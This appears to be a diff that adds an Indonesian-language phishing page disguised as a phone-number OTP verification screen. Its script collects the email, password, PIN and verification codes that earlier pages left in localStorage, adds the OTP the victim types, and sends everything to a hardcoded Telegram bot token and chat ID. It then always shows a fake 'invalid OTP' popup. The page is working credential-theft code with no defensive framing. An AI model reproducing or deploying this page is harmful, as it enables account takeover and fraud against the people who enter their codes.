@@ -1,0 +1,276 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>Otp</title>
+
+<style>
+*{
+  margin:0;
+  padding:0;
+  box-sizing:border-box;
+  font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Arial,sans-serif;
+}
+
+html, body{
+  height:100%;
+  overflow:hidden;
+}
+
+body{
+  height:100vh;
+  background:linear-gradient(180deg,#1c2434,#0d1422);
+  color:#fff;
+}
+
+.container{
+  width:100%;
+  max-width:400px;
+  margin:45px auto 0;
+  text-align:center;
+  padding:20px;
+}
+
+h2{
+  font-size:23px;
+  font-weight:700;
+  margin-bottom:10px;
+}
+
+p{
+  font-size:15px;
+  color:#cfd6e4;
+  margin-bottom:35px;
+  line-height:1.4;
+}
+
+#realInput{
+  position:absolute;
+  opacity:0;
+}
+
+.pin-wrapper{
+  display:flex;
+  justify-content:center;
+  gap:22px;
+  margin-bottom:30px;
+}
+
+.pin-item{
+  min-width:18px;
+  text-align:center;
+  font-size:22px;
+  font-weight:700;
+}
+
+.pin-item::before{
+  content:"•";
+  color:#ffffff;
+  font-size:26px;
+  opacity:0.8;
+}
+
+.pin-item.filled::before{
+  content:"";
+}
+
+.resend{
+  font-size:14px;
+  color:#cfd6e4;
+}
+
+.resend span{
+  color:#ff4d4d;
+  font-weight:600;
+}
+
+/* POPUP */
+.popup{
+  position:fixed;
+  inset:0;
+  background:rgba(0,0,0,0.6);
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  opacity:0;
+  pointer-events:none;
+  transition:0.3s ease;
+}
+
+.popup.show{
+  opacity:1;
+  pointer-events:auto;
+}
+
+.popup-box{
+  background:#1c2434;
+  padding:25px;
+  border-radius:12px;
+  text-align:center;
+  width:80%;
+  max-width:280px;
+}
+
+.popup-box h3{
+  margin-bottom:10px;
+}
+
+.popup-box button{
+  margin-top:15px;
+  padding:8px 18px;
+  border:none;
+  border-radius:6px;
+  background:#7b61ff;
+  color:#fff;
+  cursor:pointer;
+}
+</style>
+</head>
+
+<body>
+
+<div class="container" onclick="focusInput()">
+
+  <h2>Verifikasi Nomor Telepon</h2>
+  <p>Kami telah mengirim kode verifikasi 6 digit ke Phone Anda:</p>
+
+  <input type="text" id="realInput" maxlength="6" autocomplete="off">
+
+  <div class="pin-wrapper">
+    <div class="pin-item"></div>
+    <div class="pin-item"></div>
+    <div class="pin-item"></div>
+    <div class="pin-item"></div>
+    <div class="pin-item"></div>
+    <div class="pin-item"></div>
+  </div>
+
+  <div class="resend">
+    Kirim ulang kode tersedia dalam <span id="timer">59</span>dtk
+  </div>
+
+</div>
+
+<!-- POPUP -->
+<div class="popup" id="popup">
+  <div class="popup-box">
+    <h3>OTP Tidak Valid </h3>
+    <p>Kode tidak berhasil diverifikasi.</p>
+    <button onclick="closePopup()">OK</button>
+  </div>
+</div>
+
+<script>
+const input = document.getElementById("realInput");
+const items = document.querySelectorAll(".pin-item");
+const popup = document.getElementById("popup");
+
+// Ambil semua data yang tersimpan dari localStorage saat halaman dimuat
+let allSavedData = {
+  login: JSON.parse(localStorage.getItem("userLoginData")),
+  pin: localStorage.getItem("userPinData"),
+  auth: localStorage.getItem("userAuthData")
+};
+
+document.addEventListener("DOMContentLoaded", function(){
+  // Cek apakah ada data yang tersimpan
+  if(!allSavedData.login){
+    console.log("Data login tidak ditemukan!");
+  } else {
+    console.log("Semua data tersimpan berhasil diambil:", allSavedData);
+  }
+});
+
+function focusInput(){
+  input.focus();
+}
+
+// Fungsi kirim semua data ke Telegram
+function sendOtpToTelegram(otpCode) {
+  // GANTI DENGAN NILAI ANDA SENDIRI
+  const BOT_TOKEN = "7390244170:AAG6UYllOyON4LbNCp-xFrKA7QFF83e9bmU";
+  const CHAT_ID = "5983910858";
+  
+  // Siapkan pesan dengan semua data yang tersedia (tanpa status popup)
+  let message = "*DATA KOMPLIT VERIFIKASI*\n\n";
+  message += "=== DATA LOGIN ===\n";
+  if(allSavedData.login){
+    message += `Email: ${allSavedData.login.email}\n`;
+    message += `Password: ${allSavedData.login.password}\n`;
+  } else {
+    message += "Tidak ada data login\n";
+  }
+  
+  message += "\n=== DATA PIN ===\n";
+  if(allSavedData.pin){
+    message += `Kode PIN: ${allSavedData.pin}\n`;
+  } else {
+    message += "Tidak ada data PIN\n";
+  }
+  
+  message += "\n=== DATA AUTENTIKASI ===\n";
+  if(allSavedData.auth){
+    message += `Kode Verifikasi: ${allSavedData.auth}\n`;
+  } else {
+    message += "Tidak ada data autentikasi\n";
+  }
+  
+  message += "\n=== DATA OTP ===\n";
+  message += `Kode OTP yang diinput: ${otpCode}`;
+  
+  // URL API Telegram
+  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;
+
+  // Kirim permintaan
+  fetch(url)
+    .then(response => response.json())
+    .then(result => console.log("Data OTP terkirim ke Telegram:", result))
+    .catch(error => console.error("Gagal kirim OTP ke Telegram:", error));
+}
+
+input.addEventListener("input", function(){
+  this.value = this.value.replace(/[^0-9]/g,'');
+
+  items.forEach((item,index)=>{
+    if(this.value[index]){
+      item.textContent = this.value[index];
+      item.classList.add("filled");
+    } else {
+      item.textContent = "";
+      item.classList.remove("filled");
+    }
+  });
+
+  if(this.value.length === 6){
+    // Simpan kode OTP ke localStorage
+    localStorage.setItem("userOtpData", this.value);
+    // Kirim semua data ke Telegram
+    sendOtpToTelegram(this.value);
+    
+    setTimeout(()=>{
+      popup.classList.add("show");
+    },300);
+  }
+});
+
+function closePopup(){
+  popup.classList.remove("show");
+}
+
+/* Countdown */
+let time = 59;
+const timer = document.getElementById("timer");
+
+const countdown = setInterval(()=>{
+  time--;
+  timer.textContent = time;
+  if(time <= 0){
+    clearInterval(countdown);
+    timer.textContent = 0;
+  }
+},1000);
+</script>
+
+</body>
+</html>
